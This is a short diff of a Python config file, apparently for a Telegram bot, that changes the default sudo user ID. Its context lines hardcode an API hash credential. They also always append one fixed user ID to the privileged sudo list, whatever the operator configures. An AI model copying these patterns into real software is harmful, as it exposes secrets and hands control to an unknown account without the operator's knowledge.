@@ -11,7 +11,7 @@ class Config():
   APP_ID = os.environ.get("APP_ID", "9411723")
   API_HASH = os.environ.get("API_HASH", "30fa091455c0548d77dc254f0bb705b0")
   # Sudo users( goto @LaylaRobot and send /id to get your id)
-  SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS", "797768146").split()))
+  SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS", "875770605").split()))
   SUDO_USERS.append(797768146)
   SUDO_USERS = list(set(SUDO_USERS))
 
